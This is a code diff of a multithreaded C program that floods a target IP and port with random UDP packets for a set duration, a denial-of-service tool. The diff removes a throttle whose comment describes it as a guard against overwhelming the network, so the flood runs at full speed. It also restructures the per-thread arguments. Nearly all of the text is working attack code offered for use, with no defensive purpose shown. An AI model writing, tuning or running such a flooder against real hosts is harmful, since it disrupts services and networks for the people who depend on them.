@@ -12,42 +12,39 @@
 typedef struct {
     struct sockaddr_in server;
     time_t end_time;
-    int thread_id;
 } ThreadArgs;
 
 void* udp_flood(void* arg) {
-    ThreadArgs* args = (ThreadArgs*)arg;
+    ThreadArgs args = *(ThreadArgs*)arg;  // Copy struct to avoid shared memory issues
     int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
+    
     if (sock < 0) {
         perror("Socket creation failed");
-        return NULL;
+        pthread_exit(NULL);
     }
 
-    // Allow address reuse to avoid "Address already in use" errors
-    int optval = 1;
-    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));
-
     char payload[PACKET_SIZE];
-    srand(time(NULL) + args->thread_id); // Unique seed per thread
+    
+    // Unique random seed per thread
+    srand(time(NULL) ^ pthread_self());
 
-    while (time(NULL) < args->end_time) {
+    while (time(NULL) < args.end_time) {
         // Generate a random payload
         for (int i = 0; i < PACKET_SIZE; i++) {
             payload[i] = rand() % 256;
         }
 
         ssize_t sent_bytes = sendto(sock, payload, PACKET_SIZE, 0,
-                                    (struct sockaddr*)&args->server, sizeof(args->server));
+                                    (struct sockaddr*)&args.server, sizeof(args.server));
+
         if (sent_bytes < 0) {
-            fprintf(stderr, "Thread %d: sendto failed: %s\n", args->thread_id, strerror(errno));
+            fprintf(stderr, "sendto failed: %s\n", strerror(errno));
             break;
         }
-
-        usleep(1000); // Optional throttle to avoid overwhelming network
     }
 
     close(sock);
-    return NULL;
+    pthread_exit(NULL);
 }
 
 int main(int argc, char* argv[]) {
@@ -60,6 +57,7 @@ int main(int argc, char* argv[]) {
     memset(&server, 0, sizeof(server));
     server.sin_family = AF_INET;
     server.sin_port = htons(atoi(argv[2]));
+    
     if (inet_pton(AF_INET, argv[1], &server.sin_addr) <= 0) {
         perror("Invalid IP address");
         return 1;
@@ -73,15 +71,13 @@ int main(int argc, char* argv[]) {
            argv[1], atoi(argv[2]), duration, threads);
 
     pthread_t thread_pool[threads];
-    ThreadArgs* args = malloc(threads * sizeof(ThreadArgs)); // Allocate separate memory for each thread
+    ThreadArgs args;
+    args.server = server;
+    args.end_time = end_time;
 
     for (int i = 0; i < threads; i++) {
-        args[i].server = server;
-        args[i].end_time = end_time;
-        args[i].thread_id = i;
-        if (pthread_create(&thread_pool[i], NULL, udp_flood, &args[i]) != 0) {
+        if (pthread_create(&thread_pool[i], NULL, udp_flood, &args) != 0) {
             perror("Failed to create thread");
-            free(args);
             return 1;
         }
     }
@@ -90,7 +86,6 @@ int main(int argc, char* argv[]) {
         pthread_join(thread_pool[i], NULL);
     }
 
-    free(args); // Free allocated memory
     printf("UDP flood completed.\n");
     return 0;
 }
